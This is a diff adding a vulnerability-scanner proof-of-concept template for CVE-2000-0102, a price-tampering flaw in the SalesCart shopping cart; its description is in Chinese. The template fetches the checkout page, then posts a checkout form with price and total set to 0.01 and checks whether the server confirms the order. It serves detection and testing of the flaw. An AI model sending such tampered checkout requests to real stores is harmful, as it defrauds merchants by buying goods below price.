@@ -1,0 +1,51 @@
+[info]
+author = "ave"
+description = "SalesCart 购物车应用程序在购买流程中依赖前端 HTML 表单的隐藏字段（hidden form fields）传递商品价格、数量等关键信息，且服务端未对这些字段进行真实性校验与重新计算。本 PoC 通过构造并发送包含被篡改隐藏字段（如商品价格、总价）的订单提交请求，验证服务端是否接受客户端控制的数值，若存在则说明可被篡改以低价购买。"
+id = "POC-AVE-2000-0086"
+name = "SalesCart 购物车表单字段篡改漏洞 PoC"
+severity = "high"
+tags = ["ave-2000-0086"]
+vuln_id = [
+    "CVE-2000-0102",
+    "AVE-2000-0086",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cart/checkout"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cart/checkout"
+protocol = "http"
+
+[poc.requests.body]
+content = "product_id=1&quantity=1&price=0.01&total=0.01"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "order",
+    "confirmation",
+    "thank",
+    "success",
+]
+
+[references]
+urls = ["https://github.com/trickest/cve/blob/cf29b986be3ae7c9144123b101d864868676099e/2000/CVE-2000-0102.md"]
